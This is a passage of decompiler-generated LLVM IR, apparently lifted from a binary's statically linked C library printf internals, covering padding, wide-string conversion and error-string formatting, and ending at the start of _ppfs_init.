  %v7_14bcc = call i32 @_fpmaxtostr(i32 %v0_14bc0, double %v6_14bcc, i32 %v5_14bc4, i32 %v2_14bc8, i32 84012)
  store i32 %v7_14bcc, i32* %r0.global-to-local, align 4
  %v1_14bd0 = icmp slt i32 %v7_14bcc, 0
  br i1 %v1_14bd0, label %dec_label_pc_14e7c, label %dec_label_pc_14bd8

dec_label_pc_14bd8:                               ; preds = %dec_label_pc_14bb4
  %v2_14bdc = add i32 %v7_14bcc, %stack_var_-336.2
  store i32 %v2_14bdc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14e68

dec_label_pc_14be8:                               ; preds = %dec_label_pc_14bac
  br i1 %v3_14bec, label %dec_label_pc_14c88, label %dec_label_pc_14bf0

dec_label_pc_14bf0:                               ; preds = %dec_label_pc_14be8
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_14be8, label %dec_label_pc_14c00, label %dec_label_pc_14c50

dec_label_pc_14c00:                               ; preds = %dec_label_pc_14bf0
  %v2_14c00 = load i32, i32* %v1_14a08, align 4
  store i32 %v2_14c00, i32* %r3.global-to-local, align 4
  %v9_14c04 = icmp eq i32 %v2_14c00, 0
  store i32 %v2_14c00, i32* %stack_var_-44, align 4
  br i1 %v9_14c04, label %dec_label_pc_14d18, label %dec_label_pc_14c10

dec_label_pc_14c10:                               ; preds = %dec_label_pc_14c00
  %v3_14c10 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_14c10, i32* %r3.global-to-local, align 4
  store i32 %v2_14c14, i32* @r0, align 4
  %v5_14c20 = icmp slt i32 %v3_14c10, -1
  br i1 %v5_14c20, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_14c10
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_14c10, %bb161
  %storemerge193 = phi i32 [ %v3_14c10, %bb161 ], [ -1, %dec_label_pc_14c10 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_14c14, i32* @r1, align 4
  store i32 %v2_14c28, i32* %r3.global-to-local, align 4
  %v0_14c2c = call i32 @__GI_wcsrtombs()
  store i32 %v0_14c2c, i32* %r0.global-to-local, align 4
  %v7_14c30 = icmp eq i32 %v0_14c2c, -1
  store i32 %v0_14c2c, i32* @r5, align 4
  br i1 %v7_14c30, label %dec_label_pc_14e7c, label %dec_label_pc_14c3c

dec_label_pc_14c3c:                               ; preds = %bb162
  %v0_14c3c = load i32, i32* @sl, align 4
  store i32 %v0_14c3c, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_14c3c, i32* @r6, align 4
  br label %dec_label_pc_14d2c

dec_label_pc_14c50:                               ; preds = %dec_label_pc_14bf0
  store i32 %v2_14cf8, i32* %r8.global-to-local, align 4
  %v2_14c54 = load i32, i32* %v1_14a08, align 4
  store i32 %v2_14c28, i32* %r2.global-to-local, align 4
  store i32 %v2_14cf8, i32* %r0.global-to-local, align 4
  %v3_14c60 = call i32 @__GI_wcrtomb(i32 %v2_14cf8, i32 %v2_14c54, i32 %v2_14c28)
  store i32 %v3_14c60, i32* %r0.global-to-local, align 4
  %v7_14c64 = icmp eq i32 %v3_14c60, -1
  store i32 %v3_14c60, i32* @r5, align 4
  br i1 %v7_14c64, label %dec_label_pc_14e7c, label %dec_label_pc_14c70

dec_label_pc_14c70:                               ; preds = %dec_label_pc_14c50
  %v0_14c70 = load i32, i32* @sl, align 4
  store i32 %v0_14c70, i32* @r4, align 4
  store i32 %v2_14cf8, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_14c80 = trunc i32 %v0_14c70 to i8
  %v2_14c80 = load i32, i32* %r8.global-to-local, align 4
  %v4_14c80 = add i32 %v2_14c80, %v3_14c60
  %v5_14c80 = inttoptr i32 %v4_14c80 to i8*
  store i8 %v1_14c80, i8* %v5_14c80, align 1
  %v0_14d30.pre.pre = load i32, i32* @r5, align 4
  %v1_14d30.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14d2cthread-pre-split

dec_label_pc_14c88:                               ; preds = %dec_label_pc_14be8
  br i1 %v3_14c8c, label %dec_label_pc_14cec, label %dec_label_pc_14c90

dec_label_pc_14c90:                               ; preds = %dec_label_pc_14c88
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_14c98 = load i32, i32* %v1_14a08, align 4
  br i1 %v7_14c88, label %dec_label_pc_14c98, label %dec_label_pc_14cc4

dec_label_pc_14c98:                               ; preds = %dec_label_pc_14c90
  store i32 %v2_14c98, i32* @r6, align 4
  %v2_14c9c = icmp eq i32 %v2_14c98, 0
  br i1 %v2_14c9c, label %dec_label_pc_14d18, label %dec_label_pc_14ca4

dec_label_pc_14ca4:                               ; preds = %dec_label_pc_14c98, %dec_label_pc_14cf4
  %v0_14cb4 = phi i32 [ %v2_14c98, %dec_label_pc_14c98 ], [ %v3_14d04, %dec_label_pc_14cf4 ]
  %v3_14ca4 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_14ca4, i32* %r3.global-to-local, align 4
  %v5_14cb0 = icmp slt i32 %v3_14ca4, -1
  br i1 %v5_14cb0, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_14ca4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_14ca4, %bb163
  %storemerge194 = phi i32 [ %v3_14ca4, %bb163 ], [ -1, %dec_label_pc_14ca4 ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_14cb4, i32* %r0.global-to-local, align 4
  %v1_14cb8 = inttoptr i32 %v0_14cb4 to i8*
  %v2_14cb8 = call i32 @strnlen(i8* %v1_14cb8)
  store i32 %v2_14cb8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14d20

dec_label_pc_14cc4:                               ; preds = %dec_label_pc_14c90
  store i32 %v2_14c98, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_14cf8, i32* @r6, align 4
  store i32 %v2_14c98, i32* %stack_var_-180, align 4
  br label %dec_label_pc_14d2cthread-pre-split

dec_label_pc_14cec:                               ; preds = %dec_label_pc_14c88
  br i1 %v7_14cec, label %dec_label_pc_14cf4, label %dec_label_pc_14e7c

dec_label_pc_14cf4:                               ; preds = %dec_label_pc_14cec
  %v0_14cf4 = call i32 @__errno_location()
  store i32 %v0_14cf4, i32* %r0.global-to-local, align 4
  %v1_14cfc = inttoptr i32 %v0_14cf4 to i32*
  %v2_14cfc = load i32, i32* %v1_14cfc, align 4
  store i32 %v2_14cfc, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_14d04 = call i32 @__GI___glibc_strerror_r(i32 %v2_14cfc, i32 %v2_14cf8, i32 128)
  store i32 %v3_14d04, i32* %r0.global-to-local, align 4
  store i32 %v3_14d04, i32* @r6, align 4
  br label %dec_label_pc_14ca4

dec_label_pc_14d10:                               ; preds = %dec_label_pc_14b9c, %.thread26, %bb160
  %v0_14d30.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_14b30, %dec_label_pc_14b9c ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14d2cthread-pre-split

dec_label_pc_14d18:                               ; preds = %dec_label_pc_14c98, %dec_label_pc_14c00
  store i32 ptrtoint ([7 x i8]* @global_var_21f8c.1345 to i32), i32* @r6, align 4
  br label %dec_label_pc_14d20

dec_label_pc_14d20:                               ; preds = %bb164, %dec_label_pc_14d18
  %storemerge = phi i32 [ 6, %dec_label_pc_14d18 ], [ %v2_14cb8, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_14d2c

dec_label_pc_14d2cthread-pre-split:               ; preds = %.thread90, %dec_label_pc_14c70, %dec_label_pc_14cc4, %dec_label_pc_14d10
  %v1_14d30.pre = phi i32 [ 0, %dec_label_pc_14d10 ], [ %v1_14d30.pre.pre, %dec_label_pc_14c70 ], [ 0, %dec_label_pc_14cc4 ], [ %v2_14b9c, %.thread90 ]
  %v0_14d30.pre = phi i32 [ %v0_14d30.pre81, %dec_label_pc_14d10 ], [ %v0_14d30.pre.pre, %dec_label_pc_14c70 ], [ 1, %dec_label_pc_14cc4 ], [ %v1_14b30, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_14b24, %dec_label_pc_14d10 ], [ %v0_14a50, %dec_label_pc_14c70 ], [ %v0_14a50, %dec_label_pc_14cc4 ], [ %v0_14b24, %.thread90 ]
  %v0_14d2c.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_14d2c

dec_label_pc_14d2c:                               ; preds = %dec_label_pc_14d2cthread-pre-split, %dec_label_pc_14c3c, %dec_label_pc_14d20
  %v1_14d6c = phi i32 [ %v1_14d30.pre, %dec_label_pc_14d2cthread-pre-split ], [ %v0_14c3c, %dec_label_pc_14c3c ], [ 0, %dec_label_pc_14d20 ]
  %v0_14d30 = phi i32 [ %v0_14d30.pre, %dec_label_pc_14d2cthread-pre-split ], [ %v0_14c2c, %dec_label_pc_14c3c ], [ %storemerge, %dec_label_pc_14d20 ]
  %v0_14d38 = phi i32 [ %v0_14d2c.pr, %dec_label_pc_14d2cthread-pre-split ], [ 11, %dec_label_pc_14c3c ], [ 11, %dec_label_pc_14d20 ]
  %v0_14d74 = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_14d2cthread-pre-split ], [ %v0_14a50, %dec_label_pc_14c3c ], [ %v0_14a50, %dec_label_pc_14d20 ]
  %v7_14d2c = icmp eq i32 %v0_14d38, 11
  %v2_14d30 = add i32 %v0_14d30, %v1_14d6c
  br i1 %v7_14d2c, label %dec_label_pc_14d48, label %bb165

bb165:                                            ; preds = %dec_label_pc_14d2c
  %v7_14d40 = icmp sgt i32 %v0_14d38, 5
  %. = select i1 %v7_14d40, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_14d44 = add i32 %., %v2_14d30
  br label %dec_label_pc_14d48

dec_label_pc_14d48:                               ; preds = %dec_label_pc_14d2c, %bb165
  %v0_14d5c = phi i32 [ %v2_14d30, %dec_label_pc_14d2c ], [ %v2_14d44, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_14d4c = sub i32 %tmp97, %v0_14d5c
  %v3_14d4c = icmp uge i32 %tmp97, %v0_14d5c
  %v9_14d4c = icmp eq i32 %tmp97, %v0_14d5c
  %v2_14d50 = xor i1 %v3_14d4c, true
  %v3_14d50 = or i1 %v9_14d4c, %v2_14d50
  br i1 %v3_14d50, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_14d48
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_14d48, %bb166
  %v2_14d54 = xor i1 %v9_14d4c, true
  %v3_14d54 = and i1 %v3_14d4c, %v2_14d54
  br i1 %v3_14d54, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_14d5c.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_14d4c, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_14d6c = phi i32 [ %v1_14d5c.pre, %._crit_edge ], [ %v2_14d4c, %bb168 ]
  %v2_14d5c = add i32 %v0_14d5c, %stack_var_-336.2
  %v2_14d60 = add i32 %v2_14d5c, %v2_14d6c
  store i32 %v2_14d60, i32* %ip.global-to-local, align 4
  store i32 %v0_14d74, i32* %r3.global-to-local, align 4
  %v0_14d68 = load i32, i32* @sb, align 4
  %v7_14d68 = icmp eq i32 %v0_14d68, 48
  br i1 %v7_14d68, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_14d6c = add i32 %v2_14d6c, %v1_14d6c
  store i32 %v3_14d6c, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_14d88 = phi i32 [ %v2_14d6c, %bb169 ], [ 0, %bb170 ]
  %v1_14d74 = and i32 %v0_14d74, 8
  store i32 %v1_14d74, i32* @r8, align 4
  %v2_14d74 = icmp eq i32 %v1_14d74, 0
  br i1 %v2_14d74, label %dec_label_pc_14d80, label %dec_label_pc_14d9c

dec_label_pc_14d80:                               ; preds = %.thread29
  %v0_14d80 = load i32, i32* @fp, align 4
  store i32 %v0_14d80, i32* %r0.global-to-local, align 4
  store i32 %v0_14d88, i32* %r2.global-to-local, align 4
  %v4_14d8c = call i32 @_charpad(i32 %v0_14d80, i8 32, i32 %v0_14d88)
  store i32 %v4_14d8c, i32* %r0.global-to-local, align 4
  %v1_14d90 = load i32, i32* @sl, align 4
  %v9_14d90 = icmp eq i32 %v4_14d8c, %v1_14d90
  br i1 %v9_14d90, label %dec_label_pc_14d98, label %dec_label_pc_14e7c

dec_label_pc_14d98:                               ; preds = %dec_label_pc_14d80
  %v0_14d98 = load i32, i32* @r8, align 4
  store i32 %v0_14d98, i32* @sl, align 4
  %v0_14da4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14d9c

dec_label_pc_14d9c:                               ; preds = %.thread29, %dec_label_pc_14d98
  %v0_14da4 = phi i32 [ %v0_14d38, %.thread29 ], [ %v0_14da4.pre, %dec_label_pc_14d98 ]
  %v0_14da0 = load i32, i32* @fp, align 4
  %v2_14da4 = add i32 %v0_14da4, ptrtoint (i32* @global_var_21f94.1347 to i32)
  store i32 %v2_14da4, i32* %r0.global-to-local, align 4
  %v2_14da8 = inttoptr i32 %v2_14da4 to i8*
  %v3_14da8 = call i32 @__GI_fputs_unlocked(i8* %v2_14da8, i32 %v0_14da0)
  %v0_14dac = load i32, i32* @fp, align 4
  store i32 %v0_14dac, i32* %r0.global-to-local, align 4
  %v0_14db4 = load i32, i32* @r4, align 4
  store i32 %v0_14db4, i32* %r2.global-to-local, align 4
  %v4_14db8 = call i32 @_charpad(i32 %v0_14dac, i8 48, i32 %v0_14db4)
  store i32 %v4_14db8, i32* %r0.global-to-local, align 4
  %v1_14dbc = load i32, i32* @r4, align 4
  %v9_14dbc = icmp eq i32 %v4_14db8, %v1_14dbc
  br i1 %v9_14dbc, label %dec_label_pc_14dc4, label %dec_label_pc_14e7c

dec_label_pc_14dc4:                               ; preds = %dec_label_pc_14d9c
  %v3_14dc4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_14dc4, i32* %r3.global-to-local, align 4
  %v2_14dc8 = icmp eq i32 %v3_14dc4, 0
  br i1 %v2_14dc8, label %dec_label_pc_14dd8, label %dec_label_pc_14e38thread-pre-split

dec_label_pc_14dd8:                               ; preds = %dec_label_pc_14dc4
  %v0_14dd8 = load i32, i32* @r5, align 4
  %v2_14dd8 = icmp eq i32 %v0_14dd8, 0
  br i1 %v2_14dd8, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_14dd8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_14dd8
  %v1_14de0 = load i32, i32* @r6, align 4
  store i32 %v1_14de0, i32* %r0.global-to-local, align 4
  %v1_14de8 = load i32, i32* @fp, align 4
  store i32 %v1_14de8, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 85488, i32* @lr, align 4
  %v1_14dec = xor i1 %v2_14dd8, true
  call void @__pseudo_cond_branch(i1 %v1_14dec, i32 ptrtoint (i32* @global_var_17e7c.1338 to i32))
  %v0_14df0 = load i32, i32* %r0.global-to-local, align 4
  %v1_14df0 = load i32, i32* @r5, align 4
  %v9_14df0 = icmp eq i32 %v0_14df0, %v1_14df0
  br i1 %v9_14df0, label %dec_label_pc_14e50, label %dec_label_pc_14e7c

dec_label_pc_14dfc:                               ; preds = %dec_label_pc_14e38
  %v2_14dfc = icmp ult i32 %v1_14e00, 128
  %.v1_14e00 = select i1 %v2_14dfc, i32 %v1_14e00, i32 128
  store i32 %.v1_14e00, i32* @r2, align 4
  %v0_14e08 = call i32 @__GI_wcsrtombs()
  store i32 %v0_14e08, i32* @r4, align 4
  %v2_14e0c = icmp eq i32 %v0_14e08, 0
  store i32 %v0_14e08, i32* %r3.global-to-local, align 4
  store i32 %v2_14cf8, i32* %r0.global-to-local, align 4
  %v0_14e1c = load i32, i32* @fp, align 4
  store i32 %v0_14e1c, i32* %r2.global-to-local, align 4
  br i1 %v2_14e0c, label %dec_label_pc_14e2c, label %dec_label_pc_14e24

dec_label_pc_14e24:                               ; preds = %dec_label_pc_14dfc
  %v3_14e24 = call i32 @__stdio_fwrite(i32 %v2_14cf8, i32 %v0_14e08, i32 %v0_14e1c)
  store i32 %v3_14e24, i32* %r0.global-to-local, align 4
  store i32 %v3_14e24, i32* %r3.global-to-local, align 4
  %v1_14e2c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14e2c

dec_label_pc_14e2c:                               ; preds = %dec_label_pc_14dfc, %dec_label_pc_14e24
  %v1_14e2c = phi i32 [ 0, %dec_label_pc_14dfc ], [ %v1_14e2c.pre, %dec_label_pc_14e24 ]
  %v0_14e30 = phi i32 [ 0, %dec_label_pc_14dfc ], [ %v3_14e24, %dec_label_pc_14e24 ]
  %v9_14e2c = icmp eq i32 %v0_14e30, %v1_14e2c
  %v1_14e30 = load i32, i32* @r5, align 4
  %v2_14e30 = sub i32 %v1_14e30, %v0_14e30
  store i32 %v2_14e30, i32* @r5, align 4
  br i1 %v9_14e2c, label %dec_label_pc_14e38, label %dec_label_pc_14e7c

dec_label_pc_14e38thread-pre-split:               ; preds = %dec_label_pc_14dc4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_14e3c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_14e38

dec_label_pc_14e38:                               ; preds = %dec_label_pc_14e38thread-pre-split, %dec_label_pc_14e2c
  %v1_14e00 = phi i32 [ %v0_14e3c.pr, %dec_label_pc_14e38thread-pre-split ], [ %v2_14e30, %dec_label_pc_14e2c ]
  store i32 %v2_14cf8, i32* @r6, align 4
  %v2_14e3c = icmp eq i32 %v1_14e00, 0
  store i32 %v2_14c14, i32* @r1, align 4
  store i32 %v2_14c28, i32* %r3.global-to-local, align 4
  store i32 %v2_14cf8, i32* @r0, align 4
  br i1 %v2_14e3c, label %dec_label_pc_14e50, label %dec_label_pc_14dfc

dec_label_pc_14e50:                               ; preds = %dec_label_pc_14e38, %.thread36
  %v0_14e50 = load i32, i32* @fp, align 4
  store i32 %v0_14e50, i32* %r0.global-to-local, align 4
  %v0_14e58 = load i32, i32* @sl, align 4
  store i32 %v0_14e58, i32* %r2.global-to-local, align 4
  %v4_14e5c = call i32 @_charpad(i32 %v0_14e50, i8 32, i32 %v0_14e58)
  store i32 %v4_14e5c, i32* %r0.global-to-local, align 4
  %v1_14e60 = load i32, i32* @sl, align 4
  %v9_14e60 = icmp eq i32 %v4_14e5c, %v1_14e60
  br i1 %v9_14e60, label %dec_label_pc_14e68, label %dec_label_pc_14e7c

dec_label_pc_14e68:                               ; preds = %dec_label_pc_14e50, %dec_label_pc_14bd8, %dec_label_pc_149fc
  %stack_var_-316.3 = phi i32 [ %v0_14a50, %dec_label_pc_149fc ], [ %v0_14d74, %dec_label_pc_14e50 ], [ %v0_14a50, %dec_label_pc_14bd8 ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_149fc ], [ %v2_14d60, %dec_label_pc_14e50 ], [ %v2_14bdc, %dec_label_pc_14bd8 ]
  %v3_14e68 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_14e68, i32* @r4, align 4
  br label %dec_label_pc_14e6c

dec_label_pc_14e6c:                               ; preds = %dec_label_pc_1490c, %dec_label_pc_14e68
  %v0_14e6c = phi i32 [ %v0_14e6c.pre, %dec_label_pc_1490c ], [ %v3_14e68, %dec_label_pc_14e68 ]
  %v0_14a50 = phi i32 [ %tmp100, %dec_label_pc_1490c ], [ %stack_var_-316.3, %dec_label_pc_14e68 ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_1490c ], [ %stack_var_-336.3, %dec_label_pc_14e68 ]
  store i32 %v0_14e6c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14924.outer

dec_label_pc_14924.outer:                         ; preds = %dec_label_pc_14e74, %dec_label_pc_14e6c
  %v5_14950 = phi i32 [ %v1_14980, %dec_label_pc_14e74 ], [ %v0_14e6c, %dec_label_pc_14e6c ]
  %v0_1492449 = phi i32 [ %v1_14e74, %dec_label_pc_14e74 ], [ %v0_14e6c, %dec_label_pc_14e6c ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_14e74 ], [ %stack_var_-336.4, %dec_label_pc_14e6c ]
  %v1_14924180 = inttoptr i32 %v0_1492449 to i8*
  %v2_14924181 = load i8, i8* %v1_14924180, align 1
  %v3_14924182 = zext i8 %v2_14924181 to i32
  store i32 %v3_14924182, i32* %r3.global-to-local, align 4
  %v2_14928183 = icmp eq i8 %v2_14924181, 0
  br i1 %v2_14928183, label %dec_label_pc_14940, label %bb126

dec_label_pc_14e74:                               ; preds = %dec_label_pc_14980
  %v1_14e74 = add i32 %v0_14988, 2
  store i32 %v1_14e74, i32* @r4, align 4
  br label %dec_label_pc_14924.outer

dec_label_pc_14e7c:                               ; preds = %dec_label_pc_14cec, %dec_label_pc_14e50, %.thread36, %dec_label_pc_14d9c, %dec_label_pc_14d80, %dec_label_pc_14c50, %bb162, %dec_label_pc_14bb4, %bb130, %dec_label_pc_14e2c
  br label %dec_label_pc_14e84

dec_label_pc_14e84:                               ; preds = %dec_label_pc_14974, %bb, %dec_label_pc_148f4, %dec_label_pc_14e7c
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_148f4 ], [ -1, %dec_label_pc_14e7c ], [ %stack_var_-336.2, %dec_label_pc_14974 ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_148b0, i32* @r5, align 4
  store i32 %v15_148b0, i32* @r8, align 4
  store i32 %v18_148b0, i32* @sb, align 4
  store i32 %v21_148b0, i32* @sl, align 4
  store i32 %v24_148b0, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_14e74, { 1, 0 }
  uselistorder i8 %v2_14924181, { 1, 2, 0 }
  uselistorder i32 %v0_1492449, { 2, 0, 1 }
  uselistorder i32 %v5_14950, { 2, 3, 1, 0 }
  uselistorder i32 %v0_14a50, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_14e6c, { 1, 0, 2 }
  uselistorder i32 %v1_14e00, { 2, 1, 0 }
  uselistorder i32 %v0_14e08, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14d88, { 1, 0 }
  uselistorder i32 %v2_14d6c, { 2, 0, 1 }
  uselistorder i1 %v3_14d4c, { 1, 0 }
  uselistorder i32 %v0_14d5c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_14d30, { 1, 0 }
  uselistorder i32 %v0_14d74, { 1, 0, 2 }
  uselistorder i32 %v3_14d04, { 1, 2, 0 }
  uselistorder i32 %v0_14cb4, { 1, 0 }
  uselistorder i32 %v2_14c98, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_14c60, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14c2c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_14b30, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_14b4c, { 1, 2, 3, 0 }
  uselistorder i32 %v6_14acc, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_14a30, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_149e0.pre, { 2, 1, 0 }
  uselistorder i32 %v1_149d8, { 1, 0 }
  uselistorder i32 %v1_14980, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_14940, { 1, 0 }
  uselistorder i32 %v1_14938.lcssa, { 1, 0 }
  uselistorder i8 %v2_14924, { 1, 2, 0 }
  uselistorder i32 %v2_14938, { 1, 2, 3, 0 }
  uselistorder i1 %v7_14b44, { 1, 0 }
  uselistorder i1 %v7_14a90, { 1, 2, 0 }
  uselistorder i1 %v7_14c88, { 1, 0 }
  uselistorder i1 %v7_14be8, { 1, 0 }
  uselistorder i1 %v7_14ad4, { 1, 0 }
  uselistorder i32 %v2_14c28, { 0, 2, 1, 3 }
  uselistorder i32 %v2_14cf8, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_14a08, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_149dc, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_149bc, { 1, 2, 0 }
  uselistorder i32 %v4_149b4, { 1, 0 }
  uselistorder i32 %v2_148b8, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 4, 5, 2, 3, 6, 7, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 39, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 24, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 2, 22, 23, 25, 26, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 6, 5, 8, 7, 10, 9, 11, 12, 14, 13, 16, 15, 17, 18, 21, 19, 20, 23, 22, 25, 24, 27, 26, 29, 28, 33, 30, 31, 32, 1, 34, 35, 36, 37, 3, 2, 39, 38, 41, 40, 43, 42, 45, 44, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 55, { 2, 1, 0 }
  uselistorder i32 87, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14e84, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_14e7c, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_14e6c, { 1, 0 }
  uselistorder label %dec_label_pc_14e2c, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_14d9c, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_14d48, { 1, 0 }
  uselistorder label %dec_label_pc_14d2c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14d2cthread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14d20, { 1, 0 }
  uselistorder label %dec_label_pc_14d10, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_14ca4, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_14a80, { 1, 0 }
  uselistorder label %dec_label_pc_14a7c, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_149d4, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_14974, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_14940, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_14ea4 = load i32, i32* @r4, align 4
  store i32 %v3_14ea4, i32* %stack_var_-12, align 4
  %v6_14ea4 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_14eb0 = load i32, i32* @r1, align 4
  store i32 %v0_14eb0, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_14eb8 = bitcast i32* %arg1 to i8*
  %v3_14eb8 = call i32 @__GI_memset(i8* %v2_14eb8, i32 0)
  %v0_14ebc = load i32, i32* @r4, align 4
  %v1_14ebc = add i32 %v0_14ebc, 24
  %v2_14ebc = inttoptr i32 %v1_14ebc to i32*
  %v3_14ebc = load i32, i32* %v2_14ebc, align 4
